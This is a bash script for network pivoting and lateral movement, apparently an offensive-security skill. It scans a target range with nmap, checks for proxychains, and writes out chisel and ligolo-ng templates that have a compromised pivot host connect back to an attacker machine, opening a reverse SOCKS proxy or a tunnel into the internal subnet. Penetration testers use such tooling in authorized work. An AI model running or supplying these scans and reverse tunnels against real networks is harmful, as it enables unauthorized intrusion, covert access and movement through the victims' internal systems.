#!/usr/bin/env bash
# Network pivoting and lateral movement pipeline
# Usage: ./skills/network/scripts/network-pivot.sh <target_ip_or_range>
set -euo pipefail
TARGET="${1:?Usage: network-pivot.sh <target_ip_or_range>}"
OUT="network-output/$TARGET/$(date +%Y%m%d)"
mkdir -p "$OUT"
echo "[*] Starting network pivot recon on $TARGET"
echo "[*] Output: $OUT"

# Internal network discovery
echo "[1/5] Internal network discovery (nmap)..."
nmap -sn "$TARGET" -oG "$OUT/hosts-alive.txt" 2>/dev/null || echo "$TARGET" > "$OUT/hosts-alive.txt"

# Port scan alive hosts
echo "[2/5] Port scanning discovered hosts..."
HOSTS=$(grep "Up" "$OUT/hosts-alive.txt" 2>/dev/null | awk '{print $2}' || echo "$TARGET")
for host in $HOSTS; do
  nmap -sV -T4 --top-ports 1000 "$host" -oN "$OUT/ports-$host.txt" 2>/dev/null || true
done

# SOCKS proxy check — test if proxychains is configured
echo "[3/5] Checking proxychains configuration..."
if command -v proxychains4 >/dev/null 2>&1; then
  echo "proxychains4 available" > "$OUT/proxy-status.txt"
  proxychains4 -q nmap -sT -Pn --top-ports 100 "$TARGET" -oN "$OUT/proxychains-scan.txt" 2>/dev/null || echo "proxychains scan failed or not configured" > "$OUT/proxychains-scan.txt"
elif command -v proxychains >/dev/null 2>&1; then
  echo "proxychains available" > "$OUT/proxy-status.txt"
  proxychains nmap -sT -Pn --top-ports 100 "$TARGET" -oN "$OUT/proxychains-scan.txt" 2>/dev/null || echo "proxychains scan failed or not configured" > "$OUT/proxychains-scan.txt"
else
  echo "proxychains not installed — install with: apt install proxychains4" > "$OUT/proxy-status.txt"
fi

# Chisel tunnel setup helper
echo "[4/5] Generating chisel tunnel commands..."
cat > "$OUT/chisel-commands.txt" <<CHISEL
# Chisel Tunnel Commands (run manually)
# Server (attacker machine):
#   chisel server --reverse --port 8443
#
# Client (pivot host):
#   chisel client <attacker_ip>:8443 R:1080:socks
#
# Then use proxychains with socks5 127.0.0.1:1080
CHISEL
echo "  Chisel command templates saved to $OUT/chisel-commands.txt"

# Ligolo-ng setup helper
echo "[5/5] Generating ligolo-ng tunnel commands..."
cat > "$OUT/ligolo-commands.txt" <<LIGOLO
# Ligolo-ng Tunnel Commands (run manually)
# Proxy (attacker):
#   sudo ip tuntap add user \$(whoami) mode tun ligolo
#   sudo ip link set ligolo up
#   ./proxy -selfcert -laddr 0.0.0.0:11601
#
# Agent (pivot host):
#   ./agent -connect <attacker_ip>:11601 -ignore-cert
#
# Then add route:
#   sudo ip route add <internal_subnet>/24 dev ligolo
LIGOLO
echo "  Ligolo-ng command templates saved to $OUT/ligolo-commands.txt"

echo "[*] Network pivot recon complete. Results in $OUT/"
ls -la "$OUT/"
